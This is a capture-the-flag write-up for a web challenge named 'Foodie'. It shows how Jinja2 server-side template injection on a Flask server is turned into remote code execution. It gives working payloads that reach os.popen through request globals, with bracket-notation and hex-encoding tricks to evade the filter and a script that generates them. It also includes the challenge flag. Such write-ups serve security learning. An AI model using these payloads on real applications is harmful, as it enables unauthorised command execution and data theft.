# Writeup for `Foodie`

|      author     | category | value |
|-----------------|----------|-------|
| dprakosa        | web      |  100  |

## Solution

<details>
<summary>Click here to reveal the solution!</summary>

### Walkthrough

From the response headers, we see:
```
HTTP/1.1 200 OK
Server: Werkzeug/3.1.3 Python/3.13.5
```

This hints that the server is running Flask, which uses Jinja2 for templating. Then, we can confirm that the input is vulnerable to SSTI by using `{{7*7}}` as a payload, which returns 49.

To get RCE we can try this following payload:
```python
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

However, it seems that '.' is filtered. To bypass this we can use brackets instead:
```python
# var.property == var['property']
{{ request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('cat secret')['read']() }}
```
Because underscores and words are filtered we can use hex-encoded strings instead. Here's a simple python script to convert it:

```python
payload = r"{{ request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']() }}"
for char in payload:
    if char.isalpha() or char == "_":
        print(rf"\x{hex(ord(char))[2:]}", end="")
    else:
        print(char, end="")
# note: 'request' cannot be hex-encoded because it is part of jinja syntax

```
output:
```
{{ request['\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e']['\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f']['\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f']['\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f']('\x6f\x73')['\x70\x6f\x70\x65\x6e']('\x63\x61\x74 \x73\x65\x63\x72\x65\x74')['\x72\x65\x61\x64']() }}
```

Now that we have gained RCE, we can simply modify the payload to discover the 'secret' file present in the directory and print out its content to get the flag.

### Flag(s)

- SCONES{z3rver_z1de_templ4t3_1njecti0Nz}

</details>
